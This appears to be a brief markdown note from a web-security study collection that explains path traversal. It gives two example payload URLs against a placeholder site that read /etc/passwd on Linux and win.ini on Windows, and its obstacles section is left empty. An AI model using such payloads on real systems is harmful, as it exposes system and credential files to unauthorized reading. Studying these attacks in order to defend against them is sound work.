# Path Traversal

Path Traversal allow a user to read arbitrary files via a path manipulation.

### Table of Content

- [Reading arbitrary files via path traversal](#reading-arbitrary-files-via-path-traversal)
    - [Linux server](#linux-server)
    - [Window server](#windows-server)
- [Common obstacles to exploiting path traversal vulnerabilities](#common-obstacles-to-exploiting-path-traversal-vulnerabilities)

## Reading arbitrary files via path traversal

### Linux server:

`https://insecure-website.com/loadImage?filename=../../../etc/passwd`

### Windows server:

`https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`

## Common obstacles to exploiting path traversal vulnerabilities



---

[**:arrow_right_hook: Back home**](/README.md)